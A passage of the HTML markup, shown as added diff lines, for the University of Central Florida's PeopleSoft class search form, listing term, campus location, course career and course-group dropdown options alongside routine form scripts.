id="ICAddCount" name="ICAddCount" type="hidden" value=""/><input id="ICAppClsData" name="ICAppClsData" type="hidden" value=""/></div>
+</div>
+<a id="ICFirstAnchor_win0" name="ICFirstAnchor_win0"></a>
+<div class="ps_pagecontainer" id="win0divPAGECONTAINER">
+<table aria-labelledby="app_label" class="PSPAGECONTAINER" role="main">
+<tr>
+<td>
+<div class="ps_pspagecontainer" id="win0divPSPAGECONTAINER">
+<table border="0" cellpadding="0" cellspacing="0" class="PSPAGECONTAINER" cols="7" id="ACE_width" role="presentation" width="1109">
+<tr>
+<td height="0" width="0"></td>
+<td width="36"></td>
+<td width="508"></td>
+<td width="112"></td>
+<td width="12"></td>
+<td width="434"></td>
+<td width="7"></td>
+</tr>
+<tr>
+<td colspan="4" height="12"></td>
+<td align="left" rowspan="3" valign="top">
+<div id="win0div$ICField255">
+<div style="width:12px; "><!-- Begin HTML Area Name Undisclosed -->
+<script src="https://www.google.com/recaptcha/api.js" type="text/javascript">
+</script>
+<!-- End HTML Area --></div>
+</div>
+</td>
+</tr>
+<tr>
+<td height="52"></td>
+<td align="left" colspan="2" valign="top">
+<div id="win0divDERIVED_CLSRCH_GROUPBOX2">
+<table cellpadding="2" cellspacing="0" class="PABACKGROUNDINVISIBLEWBO" cols="1" width="543">
+<tr>
+<td align="left" class="PAGROUPBOXLABELINVISIBLE">Groupbox</td>
+</tr>
+<tr>
+<td width="541">
+<table border="0" cellpadding="0" cellspacing="0" class="PABACKGROUNDINVISIBLE" cols="4" id="ACE_DERIVED_CLSRCH_GROUPBOX2" role="presentation" style="border-style:none" width="541">
+<tr>
+<td height="0" width="3"></td>
+<td width="6"></td>
+<td width="295"></td>
+<td width="237"></td>
+</tr>
+<tr>
+<td colspan="2" height="14"></td>
+<td align="left" colspan="2" valign="top">
+<div id="win0divDERIVED_CLSRCH_SS_TRANSACT_TITLE"><span aria-level="1" class="PATRANSACTIONTITLE" id="DERIVED_CLSRCH_SS_TRANSACT_TITLE" role="heading">Search for Classes</span></div>
+</td>
+</tr>
+<tr>
+<td height="9"></td>
+<td align="left" colspan="2" rowspan="2" valign="top">
+<div id="win0divDERIVED_CLSRCH_SSR_CLASS_LBLlbl"><span class="PAPAGETITLE">Enter Search Criteria</span></div>
+</td>
+</tr>
+<tr>
+<td height="13"></td>
+<td align="left" valign="top">
+<div id="win0divDERIVED_CLSRCH_SSR_CLASS_LBL"><span class="PSEDITBOX_DISPONLY" id="DERIVED_CLSRCH_SSR_CLASS_LBL"> </span></div>
+</td>
+</tr>
+</table>
+</td>
+</tr>
+</table>
+</div>
+</td>
+</tr>
+<tr>
+<td colspan="4" height="0"></td>
+</tr>
+<tr>
+<td height="762"></td>
+<td align="left" colspan="5" valign="top">
+<div id="win0divDERIVED_CLSRCH_GROUP2">
+<table cellpadding="2" cellspacing="0" class="PSGROUPBOXWBO" cols="1" width="1101">
+<tr>
+<td align="left" class="PSGROUPBOXLABEL">Search for Classes</td>
+</tr>
+<tr>
+<td width="1097">
+<table border="0" cellpadding="0" cellspacing="0" class="PSGROUPBOX" cols="5" id="ACE_DERIVED_CLSRCH_GROUP2" role="presentation" style="border-style:none" width="1097">
+<tr>
+<td height="0" width="2"></td>
+<td width="716"></td>
+<td width="182"></td>
+<td width="193"></td>
+<td width="4"></td>
+</tr>
+<tr>
+<td height="87"></td>
+<td align="left" colspan="2" valign="top">
+<div id="win0divDERIVED_CLSRCH_GROUP3">
+<table cellpadding="2" cellspacing="0" class="PABACKGROUNDINVISIBLEWBO" cols="1" width="897">
+<tr>
+<td align="left" class="PAGROUPBOXLABELINVISIBLE">Class Search Criteria</td>
+</tr>
+<tr>
+<td width="895">
+<table border="0" cellpadding="0" cellspacing="0" class="PABACKGROUNDINVISIBLE" cols="4" id="ACE_DERIVED_CLSRCH_GROUP3" role="presentation" style="border-style:none" width="895">
+<tr>
+<td height="0" width="3"></td>
+<td width="588"></td>
+<td width="72"></td>
+<td width="232"></td>
+</tr>
+<tr>
+<td height="24"></td>
+<td align="left" colspan="2" valign="top">
+<div id="win0div$ICField171">
+<table cellpadding="2" cellspacing="0" class="PABACKGROUNDINVISIBLEWBO" cols="1" width="659">
+<tr>
+<td width="657">
+<table border="0" cellpadding="0" cellspacing="0" class="PABACKGROUNDINVISIBLE" cols="4" id="ACE_$ICField171" role="presentation" style="border-style:none" width="657">
+<tr>
+<td height="0" width="0"></td>
+<td width="227"></td>
+<td width="3"></td>
+<td width="427"></td>
+</tr>
+<tr>
+<td colspan="3" height="4"></td>
+<td align="left" rowspan="2" valign="top">
+<div id="win0divCLASS_SRCH_WRK2_INSTITUTION$31$"><select class="PSDROPDOWNLIST" id="CLASS_SRCH_WRK2_INSTITUTION$31$" name="CLASS_SRCH_WRK2_INSTITUTION$31$" onchange="addchg_win0(this);submitAction_win0(this.form,this.id);" onkeydown="if ((typeof isLoaderInProcess == 'function') &amp;&amp; isLoaderInProcess() &amp;&amp; ptCommonObj2!=null) { ptCommonObj2.terminateEvent(event); } " size="1" style="width:220px; " tabindex="21">
+<option value=""> </option>
+<option selected="selected" value="UCF01">University of Central Florida</option>
+</select></div>
+</td>
+</tr>
+<tr>
+<td height="14"></td>
+<td align="right" valign="top">
+<div id="win0divCLASS_SRCH_WRK2_INSTITUTION$31$lbl"><label class="PSDROPDOWNLABEL" for="CLASS_SRCH_WRK2_INSTITUTION$31$" id="CLASS_SRCH_WRK2_INSTITUTION$31$_LBL">Institution</label></div>
+</td>
+</tr>
+</table>
+</td>
+</tr>
+</table>
+</div>
+</td>
+</tr>
+<tr>
+<td height="26"></td>
+<td align="left" valign="top">
+<div id="win0divDERIVED_CLSRCH_SSR_GROUP1">
+<table cellpadding="2" cellspacing="0" class="PABACKGROUNDINVISIBLEWBO" cols="1" width="587">
+<tr>
+<td width="585">
+<table border="0" cellpadding="0" cellspacing="0" class="PABACKGROUNDINVISIBLE" cols="4" id="ACE_DERIVED_CLSRCH_SSR_GROUP1" role="presentation" style="border-style:none" width="585">
+<tr>
+<td height="0" width="0"></td>
+<td width="227"></td>
+<td width="3"></td>
+<td width="355"></td>
+</tr>
+<tr>
+<td colspan="3" height="4"></td>
+<td align="left" rowspan="2" valign="top">
+<div id="win0divCLASS_SRCH_WRK2_STRM$35$"><select class="PSDROPDOWNLIST" id="CLASS_SRCH_WRK2_STRM$35$" name="CLASS_SRCH_WRK2_STRM$35$" onchange="addchg_win0(this);submitAction_win0(this.form,this.id);" onkeydown="if ((typeof isLoaderInProcess == 'function') &amp;&amp; isLoaderInProcess() &amp;&amp; ptCommonObj2!=null) { ptCommonObj2.terminateEvent(event); } " size="1" style="width:220px; " tabindex="22">
+<option value=""></option>
+<option value=""> </option>
+<option value="1740">1740 - Spring 2022</option>
+<option value="1750">1750 - Summer 2022</option>
+<option selected="selected" value="1760">1760 - Fall 2022</option>
+<option value="1770">1770 - Spring 2023</option>
+</select></div>
+</td>
+</tr>
+<tr>
+<td height="12"></td>
+<td align="right" valign="top">
+<div id="win0divCLASS_SRCH_WRK2_STRM$35$lbl"><label class="PSDROPDOWNLABEL" for="CLASS_SRCH_WRK2_STRM$35$" id="CLASS_SRCH_WRK2_STRM$35$_LBL">Term</label></div>
+</td>
+</tr>
+</table>
+</td>
+</tr>
+</table>
+</div>
+</td>
+</tr>
+<tr>
+<td colspan="4" height="0"></td>
+</tr>
+<tr>
+<td height="29"></td>
+<td align="left" colspan="2" valign="top">
+<div id="win0div$ICField252">
+<table cellpadding="2" cellspacing="0" class="PABACKGROUNDINVISIBLEWBO" cols="1" width="659">
+<tr>
+<td width="657">
+<table border="0" cellpadding="0" cellspacing="0" class="PABACKGROUNDINVISIBLE" cols="3" id="ACE_$ICField252" role="presentation" style="border-style:none" width="657">
+<tr>
+<td height="0" width="7"></td>
+<td width="436"></td>
+<td width="214"></td>
+</tr>
+<tr>
+<td height="23"></td>
+<td align="left" valign="top">
+<div id="win0div$ICField143"><span class="PAPAGEINSTRUCTIONS">Select at least 2 search criteria. Select Search to view your search results.</span></div>
+</td>
+</tr>
+</table>
+</td>
+</tr>
+</table>
+</div>
+</td>
+</tr>
+<tr>
+<td colspan="4" height="3"></td>
+</tr>
+</table>
+</td>
+</tr>
+</table>
+</div>
+</td>
+</tr>
+<tr>
+<td height="633"></td>
+<td align="left" colspan="3" valign="top">
+<div id="win0divDERIVED_CLSRCH_GROUP4">
+<table cellpadding="2" cellspacing="0" class="PABACKGROUNDINVISIBLEWBO" cols="1" width="1090">
+<tr>
+<td width="1088">
+<table border="0" cellpadding="0" cellspacing="0" class="PABACKGROUNDINVISIBLE" cols="3" id="ACE_DERIVED_CLSRCH_GROUP4" role="presentation" style="border-style:none" width="1088">
+<tr>
+<td height="0" width="3"></td>
+<td width="1080"></td>
+<td width="5"></td>
+</tr>
+<tr>
+<td height="619"></td>
+<td align="left" valign="top">
+<div id="win0div$ICField193$0">
+<table cellpadding="2" cellspacing="0" class="PABACKGROUNDINVISIBLEWBO" cols="1" id="$ICField193$scroll$0" onclick="getScrollTableId('$ICField193$scroll$0')" width="1079">
+<tr>
+<td width="1077">
+<table border="0" cellpadding="0" cellspacing="0" class="PABACKGROUNDINVISIBLE" cols="4" id="ACE_$ICField193$0" role="presentation" style="border-style:none" width="1077">
+<tr>
+<td height="0" width="0"></td>
+<td width="504"></td>
+<td width="569"></td>
+<td width="5"></td>
+</tr>
+<tr>
+<td height="21"></td>
+<td align="left" valign="top">
+<div id="win0divDERIVED_CLSRCH_SSR_EXPAND_COLLAPS$0">
+<table cellpadding="2" cellspacing="0" class="PABACKGROUNDINVISIBLEWBO" cols="1" width="503">
+<tr>
+<td align="left" class="PAGROUPBOXLABELINVISIBLE">Class Search</td>
+</tr>
+<tr>
+<td width="501">
+<table border="0" cellpadding="0" cellspacing="0" class="PABACKGROUNDINVISIBLE" cols="4" id="ACE_DERIVED_CLSRCH_SSR_EXPAND_COLLAPS$0" role="presentation" style="border-style:none" width="501">
+<tr>
+<td height="0" width="3"></td>
+<td width="16"></td>
+<td width="250"></td>
+<td width="232"></td>
+</tr>
+<tr>
+<td height="1"></td>
+<td align="left" nowrap="nowrap" rowspan="3" valign="top">
+<div id="win0divDERIVED_CLSRCH_SSR_EXPAND_COLLAPS$149$$0"><a href="javascript:submitAction_win0(document.win0,'DERIVED_CLSRCH_SSR_EXPAND_COLLAPS$149$$0');" id="DERIVED_CLSRCH_SSR_EXPAND_COLLAPS$149$$0" name="DERIVED_CLSRCH_SSR_EXPAND_COLLAPS$149$$0" onclick="javascript:cancelBubble(event);" role="button" tabindex="40"><img alt="Class Search" border="0" id="DERIVED_CLSRCH_SSR_EXPAND_COLLAPS$149$$IMG$0" src="https://csprod-ss.net.ucf.edu/cs/CSPROD/cache9/PS_COLLAPSE_ICN_1.gif" title="Class Search"/></a></div>
+</td>
+</tr>
+<tr>
+<td height="2"></td>
+<td align="left" rowspan="2" valign="top">
+<div id="win0divDERIVED_CLSRCH_SSR_EXPAND_COLLAPS$255$lbl$0"><span class="PSEDITBOXLABEL">Class Search</span></div>
+</td>
+</tr>
+<tr>
+<td height="13"></td>
+<td align="left" valign="top">
+<div id="win0divDERIVED_CLSRCH_SSR_EXPAND_COLLAPS$255$$0"><span class="PTTRANSPARENT" id="DERIVED_CLSRCH_SSR_EXPAND_COLLAPS$255$$0"> </span></div>
+</td>
+</tr>
+</table>
+</td>
+</tr>
+</table>
+</div>
+</td>
+</tr>
+<tr>
+<td height="160"></td>
+<td align="left" colspan="2" valign="top">
+<div id="win0divDERIVED_CLSRCH_SSR_GROUP_BOX_1$0">
+<table cellpadding="2" cellspacing="0" class="PABACKGROUNDINVISIBLEWBO" cols="1" width="1072">
+<tr>
+<td width="1070">
+<table border="0" cellpadding="0" cellspacing="0" class="PABACKGROUNDINVISIBLE" cols="3" id="ACE_DERIVED_CLSRCH_SSR_GROUP_BOX_1$0" role="presentation" style="border-style:none" width="1070">
+<tr>
+<td height="0" width="3"></td>
+<td width="1060"></td>
+<td width="7"></td>
+</tr>
+<tr>
+<td height="156"></td>
+<td align="left" valign="top">
+<div id="win0div$ICField232$0">
+<table cellpadding="2" cellspacing="0" class="PABACKGROUNDINVISIBLEWBO" cols="1" id="$ICField232$scrolli$0" onclick="getScrollTableId('$ICField232$scrolli$0')" width="1059">
+<tr>
+<td width="1057">
+<table border="0" cellpadding="0" cellspacing="0" class="PABACKGROUNDINVISIBLE" cols="14" id="ACE_$ICField232$0" role="presentation" style="border-style:none" width="1057">
+<tr>
+<td height="8" width="0"></td>
+<td width="220"></td>
+<td width="3"></td>
+<td width="1"></td>
+<td width="2"></td>
+<td width="1"></td>
+<td width="2"></td>
+<td width="178"></td>
+<td width="48"></td>
+<td width="4"></td>
+<td width="9"></td>
+<td width="3"></td>
+<td width="96"></td>
+<td width="490"></td>
+</tr>
+<tr>
+<td colspan="5" height="1"></td>
+<td align="left" colspan="3" nowrap="nowrap" rowspan="4" valign="top">
+<div id="win0divCLASS_SRCH_WRK2_SSR_PB_SUBJ_SRCH$0"><a class="PSPUSHBUTTON Left" role="presentation"><span style="background-Color: transparent;"><input class="PSPUSHBUTTON" id="CLASS_SRCH_WRK2_SSR_PB_SUBJ_SRCH$0" name="CLASS_SRCH_WRK2_SSR_PB_SUBJ_SRCH$0" onclick="submitAction_win0(document.win0,this.id,event);" style="width:143px; " tabindex="56" title="Search for a Subject" type="button" value="select subject"/></span></a></div>
+</td>
+</tr>
+<tr>
+<td colspan="5" height="1"></td>
+<td colspan="4" rowspan="2"></td>
+<td align="left" nowrap="nowrap" rowspan="3" valign="top">
+<div id="win0divSSR_CLSRCH_WRK_SUBJECT$0"><input class="PSEDITBOX" id="SSR_CLSRCH_WRK_SUBJECT$0" maxlength="8" name="SSR_CLSRCH_WRK_SUBJECT$0" onchange="addchg_win0(this);oChange_win0=this;" style="width:80px; " tabindex="57" type="text" value=""/></div>
+</td>
+</tr>
+<tr>
+<td colspan="5" height="2"></td>
+<td align="left" rowspan="2" valign="top">
+<div id="win0divSUBJECT_TBL_DESCR$0"><span class="PSEDITBOX_DISPONLY" id="SUBJECT_TBL_DESCR$0"> </span></div>
+</td>
+</tr>
+<tr>
+<td colspan="5" height="21"></td>
+<td align="right" colspan="3" valign="top">
+<div id="win0divSSR_CLSRCH_WRK_SUBJECTlbl$0"><label class="PSEDITBOXLABEL" for="SSR_CLSRCH_WRK_SUBJECT$0" id="SSR_CLSRCH_WRK_SUBJECT_LBL$0">Subject</label></div>
+</td>
+</tr>
+<tr>
+<td colspan="5" height="4"></td>
+<td align="left" colspan="7" rowspan="2" valign="top">
+<div id="win0divSSR_CLSRCH_WRK_SSR_EXACT_MATCH1$1"><select class="PSDROPDOWNLIST" id="SSR_CLSRCH_WRK_SSR_EXACT_MATCH1$1" name="SSR_CLSRCH_WRK_SSR_EXACT_MATCH1$1" onchange="addchg_win0(this);return doEdits_win0(this,'','N','N','N','N','Y','Y',0);" onkeydown="if ((typeof isLoaderInProcess == 'function') &amp;&amp; isLoaderInProcess() &amp;&amp; ptCommonObj2!=null) { ptCommonObj2.terminateEvent(event); } " size="1" style="width:230px; " tabindex="122">
+<option value=""> </option>
+<option selected="selected" value="C">contains</option>
+<option value="G">greater than or equal to</option>
+<option value="E">is exactly</option>
+<option value="T">less than or equal to</option>
+</select></div>
+</td>
+<td align="left" colspan="2" nowrap="nowrap" rowspan="2" valign="top">
+<div id="win0divSSR_CLSRCH_WRK_CATALOG_NBR$1"><input class="PSEDITBOX" id="SSR_CLSRCH_WRK_CATALOG_NBR$1" maxlength="10" name="SSR_CLSRCH_WRK_CATALOG_NBR$1" onchange="addchg_win0(this);return doEdits_win0(this,'','N','N','N','N','Y','N',0);" style="width:56px; " tabindex="123" type="text" value=""/></div>
+</td>
+</tr>
+<tr>
+<td height="18"></td>
+<td align="right" colspan="3" rowspan="3" valign="top">
+<div id="win0divSSR_CLSRCH_WRK_CATALOG_NBRlbl$1"><label class="PSEDITBOXLABEL" for="SSR_CLSRCH_WRK_CATALOG_NBR$1" id="SSR_CLSRCH_WRK_CATALOG_NBR_LBL$1">Course Number</label></div>
+</td>
+</tr>
+<tr>
+<td height="1"></td>
+<td colspan="6"></td>
+<td align="left" colspan="4" nowrap="nowrap" rowspan="4" valign="top">
+<div id="win0divDERIVED_AS_LBL_ES_EXAMPLE_LBL3$2"><a href="javascript:submitAction_win0(document.win0,'DERIVED_AS_LBL_ES_EXAMPLE_LBL3$2');" id="DERIVED_AS_LBL_ES_EXAMPLE_LBL3$2" name="DERIVED_AS_LBL_ES_EXAMPLE_LBL3$2" onclick="javascript:MOpopupObj_win0.StopPopup(); cancelBubble(event);" role="button" tabindex="217"><img alt="(example: statistics)" border="0" class="PSPUSHBUTTON_MO" id="DERIVED_AS_LBL_ES_EXAMPLE_LBL3$IMG$2" onkeydown="if (mouseoverHotkeyHandler(event)) MOpopupObj_win0.StartPopup('win0divDERIVED_AS_LBL_ES_EXAMPLE_LBL3$2', 'DERIVED_AS_LBL_ES_EXAMPLE_LBL3$2_24000_2745', 0, 0);" onmouseout="MOpopupObj_win0.StopPopup(); " onmouseover="MOpopupObj_win0.StartPopup('win0divDERIVED_AS_LBL_ES_EXAMPLE_LBL3$2', 'DERIVED_AS_LBL_ES_EXAMPLE_LBL3$2_24000_2745', 0, 0);" src="https://csprod-ss.net.ucf.edu/cs/CSPROD/cache9/PT_HELP_SWAN_1.gif" tabindex="217"/></a></div>
+<div id="DERIVED_AS_LBL_ES_EXAMPLE_LBL3$2_24000_2745" style="display:none; position:absolute; max-width:400px; top:0; left:0;"><span class="PTPOPUP_MSGHDR" style="display:block;">example: search by course title</span><br/>
+</div>
+</td>
+</tr>
+<tr>
+<td height="5"></td>
+<td rowspan="10"></td>
+<td align="left" colspan="4" nowrap="nowrap" rowspan="3" valign="top">
+<div id="win0divSSR_CLSRCH_WRK_DESCR$2"><input class="PSEDITBOX" id="SSR_CLSRCH_WRK_DESCR$2" maxlength="30" name="SSR_CLSRCH_WRK_DESCR$2" style="width:229px; " tabindex="215" type="text" value=""/></div>
+</td>
+</tr>
+<tr>
+<td height="1"></td>
+<td align="right" rowspan="3" valign="top">
+<div id="win0divSR_LBL_WRK_COURSE_TITLElbl$2"><span class="PSEDITBOXLABEL">Course Keyword</span></div>
+</td>
+</tr>
+<tr>
+<td height="16"></td>
+<td colspan="2" rowspan="2"></td>
+<td align="left" rowspan="8" valign="top">
+<div id="win0divSR_LBL_WRK_COURSE_TITLE$2"><span class="PTTRANSPARENT" id="SR_LBL_WRK_COURSE_TITLE$2"> </span></div>
+</td>
+</tr>
+<tr>
+<td height="4"></td>
+<td align="left" colspan="9" rowspan="2" valign="top">
+<div id="win0divSSR_CLSRCH_WRK_ACAD_CAREER$3"><select class="PSDROPDOWNLIST" id="SSR_CLSRCH_WRK_ACAD_CAREER$3" name="SSR_CLSRCH_WRK_ACAD_CAREER$3" onchange="addchg_win0(this);return doEdits_win0(this,'','N','N','N','N','Y','Y',0);" onkeydown="if ((typeof isLoaderInProcess == 'function') &amp;&amp; isLoaderInProcess() &amp;&amp; ptCommonObj2!=null) { ptCommonObj2.terminateEvent(event); } " size="1" style="width:230px; " tabindex="252">
+<option value=""> </option>
+<option value="GRAD">Graduate</option>
+<option value="MED">Medical</option>
+<option value="OTHR">Other Non-Degree</option>
+<option selected="selected" value="UGRD">Undergraduate</option>
+</select></div>
+</td>
+</tr>
+<tr>
+<td height="16"></td>
+<td align="right" colspan="2" rowspan="2" valign="top">
+<div id="win0divSSR_CLSRCH_WRK_ACAD_CAREERlbl$3"><label class="PSDROPDOWNLABEL" for="SSR_CLSRCH_WRK_ACAD_CAREER$3" id="SSR_CLSRCH_WRK_ACAD_CAREER_LBL$3">Course Career</label></div>
+</td>
+</tr>
+<tr>
+<td height="4"></td>
+<td rowspan="3"></td>
+<td align="left" colspan="9" rowspan="2" valign="top">
+<div id="win0divSSR_CLSRCH_WRK_LOCATION$4"><select class="PSDROPDOWNLIST" id="SSR_CLSRCH_WRK_LOCATION$4" name="SSR_CLSRCH_WRK_LOCATION$4" onchange="addchg_win0(this);return doEdits_win0(this,'','N','N','N','N','Y','Y',0);" onkeydown="if ((typeof isLoaderInProcess == 'function') &amp;&amp; isLoaderInProcess() &amp;&amp; ptCommonObj2!=null) { ptCommonObj2.terminateEvent(event); } " size="1" style="width:230px; " tabindex="353">
+<option selected="selected" value=""> </option>
+<option value="EXECDEVCTR">Executive Development Center</option>
+<option value="MAIN">Main Campus (Orlando)</option>
+<option value="MAIN-OFF">Main Off Campus</option>
+<option value="ONLINE-UCF">Online</option>
+<option value="ALTSPRNG">UCF Altamonte Springs</option>
+<option value="CENTRALOFF">UCF Central Region Off Campus</option>
+<option value="COCOA">UCF Cocoa</option>
+<option value="DAYTONA">UCF Daytona Beach</option>
+<option value="UCFDOWNTN">UCF Downtown</option>
+<option value="LEESBURG">UCF Leesburg</option>
+<option value="OCALA">UCF Ocala</option>
+<option value="EXPOCNTR">UCF Orlando Expo Center</option>
+<option value="PALM BAY">UCF Palm Bay</option>
+<option value="RSNHSPMG">UCF Rosen Col - Universal Blvd</option>
+<option value="RSN-OFF">UCF Rosen College Off Campus</option>
+<option value="LAKE MARY">UCF Sanford/Lake Mary</option>
+<option value="SOUTH LAKE">UCF South Lake</option>
+<option value="VAL-EAST">UCF Valencia East</option>
+<option value="OSCEOLA">UCF Valencia Osceola</option>
+<option value="VAL-SPS">UCF Valencia Schl Pub Safety</option>
+<option value="METROWEST">UCF Valencia West</option>
+</select></div>
+</td>
+</tr>
+<tr>
+<td height="16"></td>
+<td align="right" colspan="2" rowspan="2" valign="top">
+<div id="win0divSSR_CLSRCH_WRK_LOCATIONlbl$4"><label class="PSDROPDOWNLABEL" for="SSR_CLSRCH_WRK_LOCATION$4" id="SSR_CLSRCH_WRK_LOCATION_LBL$4">Location</label></div>
+</td>
+</tr>
+<tr>
+<td height="4"></td>
+<td rowspan="2"></td>
+<td align="left" colspan="8" rowspan="2" valign="top">
+<div id="win0divATTR_VAL$5"><select class="PSDROPDOWNLIST" id="ATTR_VAL$5" name="ATTR_VAL$5" size="1" style="width:228px; " tabindex="433">
+<option selected="selected" value=""> </option>
+<option value="AGINGSTDY">Aging Studies</option>
+<option value="BLENDFLEX">Blendflex</option>
+<option value="BUSCOMMPGM">Business Common Program</option>
+<option value="BUSCORE">Business Core</option>
+<option value="DIVERSITY">Diversity Requirement</option>
+<option value="GEPCOMM">GEP-Communcation Foundations</option>
+<option value="GEPCULHIST">GEP-Cultural&amp;Historical Found</option>
+<option value="GEPMATH">GEP-Mathematical Foundations</option>
+<option value="GEPSCIENCE">GEP-Science Foundations</option>
+<option value="GEPSOCIAL">GEP-Social Foundations</option>
+<option value="GRICP">GR Intrnshp, Clinical, Pract</option>
+<option value="GRM">Gordon Rule Math</option>
+<option value="GRW">Gordon Rule Writing</option>
+<option value="CAPSTONE">HIP - Capstone</option>
+<option value="GLBLRNG">HIP - Global Learning</option>
+<option value="INTGRTEXP">HIP - Integrative Experience</option>
+<option value="RSCHINTNSV">HIP - Research Intensive</option>
+<option value="SERVICELRN">HIP - Service Learning</option>
+<option value="STYABDXCHN">HIP - Study Abroad Exchange</option>
+<option value="UGICP">HIP - UG Intrnshp, Clncl, Prct</option>
+<option value="STYABDSHOR">HIP -Study Abroad Short Term</option>
+<option value="HONORS">Honors Classes</option>
+<option value="LINK">Link Classes</option>
+<option value="NURPGMPREQ">Nursing Program Pre-Requisites</option>
+<option value="PAL">Personalized Adaptive Learning</option>
+<option value="SPLT">Split level course</option>
+<option value="SCHIST">State Core Cltral/Histrcl</option>
+<option value="SCMATH">State Core Math</option>
+<option value="SCSCIENCE">State Core Science</option>
+<option value="SCSOCIAL">State Core Social</option>
+<option value="UGRESEARCH">Undergraduate Research</option>
+<option value="WOMENSTDY">Women's Studies</option>
+</select></div>
+</td>
+</tr>
+<tr>
+<td height="13"></td>
+<td align="right" colspan="3" rowspan="2" valign="top">
+<div id="win0divATTR_VALlbl$5"><label class="PSDROPDOWNLABEL" for="ATTR_VAL$5" id="ATTR_VAL_LBL$5">Special Course Group</label></div>
+</td>
+</tr>
+<tr>
+<td height="19"></td>
+<td align="left" colspan="9" nowrap="nowrap" valign="top">
+<div id="win0divSSR_CLSRCH_WRK_SSR_OPEN_ONLY$6"><input id="SSR_CLSRCH_WRK_SSR_OPEN_ONLY$chk$6" name="SSR_CLSRCH_WRK_SSR_OPEN_ONLY$chk$6" type="hidden" value="Y"/><input checked="checked" class="PSCHECKBOX" id="SSR_CLSRCH_WRK_SSR_OPEN_ONLY$6" name="SSR_CLSRCH_WRK_SSR_OPEN_ONLY$6" onclick="setupTimeout2();    this.form.SSR_CLSRCH_WRK_SSR_OPEN_ONLY$chk$6.value=(this.checked?'Y':'N');doFocus_win0(this,false,true);" tabindex="445" type="checkbox" value="Y"/><label class="PSCHECKBOX" for="SSR_CLSRCH_WRK_SSR_OPEN_ONLY$6" id="SSR_CLSRCH_WRK_SSR_OPEN_ONLY_LBL$6">Show Open Classes Only</label></div>
+</td>
+</tr>
+</table>
+</td>
+</tr>
+</table>
+</div>
+</td>
+</tr>
+<tr>
+<td colspan="3" height="3"></td>
+</tr>
+</table>
+</td>
+</tr>
+</table>
+</div>
+</td>
+</tr>
+<tr>
+<td colspan="4" height="4"></td>
+</tr>
+<tr>
+<td height="21"></td>
+<td align="left" valign="top">
+<div id="win0divDERIVED_CLSRCH_SSR_EXPAND_COLLAPS$1">
+<table cellpadding="2" cellspacing="0" class="PABACKGROUNDINVISIBLEWBO" cols="1" width="503">
+<tr>
+<td align="left" class="PAGROUPBOXLABELINVISIBLE">Additional Search Criteria</td>
+</tr>
+<tr>
+<td width="501">
+<table border="0" cellpadding="0" cellspacing="0" class="PABACKGROUNDINVISIBLE" cols="4" id="ACE_DERIVED_CLSRCH_SSR_EXPAND_COLLAPS$1" role="presentation" style="border-style:none" width="501">
+<tr>
+<td height="0" width="3"></td>
+<td width="16"></td>
+<td width="250"></td>
+<td width="232"></td>
+</tr>
+<tr>
+<td height="1"></td>
+<td align="left" nowrap="nowrap" rowspan="3" valign="top">
+<div id="win0divDERIVED_CLSRCH_SSR_EXPAND_COLLAPS$149$$1"><a href="javascript:submitAction_win0(document.win0,'DERIVED_CLSRCH_SSR_EXPAND_COLLAPS$149$$1');" id="DERIVED_CLSRCH_SSR_EXPAND_COLLAPS$149$$1" name="DERIVED_CLSRCH_SSR_EXPAND_COLLAPS$149$$1" onclick="javascript:cancelBubble(event);" role="button" tabindex="517"><img alt="Additional Search Criteria" border="0" id="DERIVED_CLSRCH_SSR_EXPAND_COLLAPS$149$$IMG$1" src="https://csprod-ss.net.ucf.edu/cs/CSPROD/cache9/PS_COLLAPSE_ICN_1.gif" title="Additional Search Criteria"/></a></div>
+</td>
+</tr>
+<tr>
+<td height="2"></td>
+<td align="left" rowspan="2" valign="top">
+<div id="win0divDERIVED_CLSRCH_SSR_EXPAND_COLLAPS$255$lbl$1"><span class="PSEDITBOXLABEL">Additional Search Criteria</span></div>
+</td>
+</tr>
+<tr>
+<td height="13"></td>
+<td align="left" valign="top">
+<div id="win0divDERIVED_CLSRCH_SSR_EXPAND_COLLAPS$255$$1"><span class="PTTRANSPARENT" id="DERIVED_CLSRCH_SSR_EXPAND_COLLAPS$255$$1"> </span></div>
+</td>
+</tr>
+</table>
+</td>
+</tr>
+</table>
+</div>
+</td>
+</tr>
+<tr>
+<td height="412"></td>
+<td align="left" colspan="2" valign="top">
+<div id="win0divDERIVED_CLSRCH_SSR_GROUP_BOX_1$1">
+<table cellpadding="2" cellspacing="0" class="PABACKGROUNDINVISIBLEWBO" cols="1" width="1072">
+<tr>
+<td width="1070">
+<table border="0" cellpadding="0" cellspacing="0" class="PABACKGROUNDINVISIBLE" cols="3" id="ACE_DERIVED_CLSRCH_SSR_GROUP_BOX_1$1" role="presentation" style="border-style:none" width="1070">
+<tr>
+<td height="0" width="3"></td>
+<td width="1060"></td>
+<td width="7"></td>
+</tr>
+<tr>
+<td height="409"></td>
+<td align="left" valign="top">
+<div id="win0div$ICField232$1">
+<table cellpadding="2" cellspacing="0" class="PABACKGROUNDINVISIBLEWBO" cols="1" id="$ICField232$scrolli$1" onclick="getScrollTableId('$ICField232$scrolli$1')" width="1059">
+<tr>
+<td width="1057">
+<table border="0" cellpadding="0" cellspacing="0" class="PABACKGROUNDINVISIBLE" cols="23" id="ACE_$ICField232$1" role="presentation" style="border-style:none" width="1057">
+<tr>
+<td height="8" width="0"></td>
+<td width="216"></td>
+<td width="3"></td>
+<td width="1"></td>
+<td width="1"></td>
+<td width="2"></td>
+<td width="1"></td>
+<td width="1"></td>
+<td width="1"></td>
+<td width="1"></td>
+<td width="2"></td>
+<td width="46"></td>
+<td width="17"></td>
+<td width="79"></td>
+<td width="63"></td>
+<td width="4"></td>
+<td width="21"></td>
+<td width="20"></td>
+<td width="4"></td>
+<td width="42"></td>
+<td width="63"></td>
+<td width="67"></td>
+<td width="402"></td>
+</tr>
+<tr>
+<td colspan="9" height="4"></td>
+<td align="left" colspan="9" rowspan="2" valign="top">
+<div id="win0divSSR_CLSRCH_WRK_SSR_START_TIME_OPR$7"><select class="PSDROPDOWNLIST" id="SSR_CLSRCH_WRK_SSR_START_TIME_OPR$7" name="SSR_CLSRCH_WRK_SSR_START_TIME_OPR$7" onchange="addchg_win0(this);submitAction_win0(this.form,this.id);" onkeydown="if ((typeof isLoaderInProcess == 'function') &amp;&amp; isLoaderInProcess() &amp;&amp; ptCommonObj2!=null) { ptCommonObj2.terminateEvent(event); } " size="1" style="width:230px; " tabindex="544">
+<option value=""> </option>
+<option value="BT">between</option>
+<option value="GT">greater than</option>
+<option selected="selected" value="GE">greater than or equal to</option>
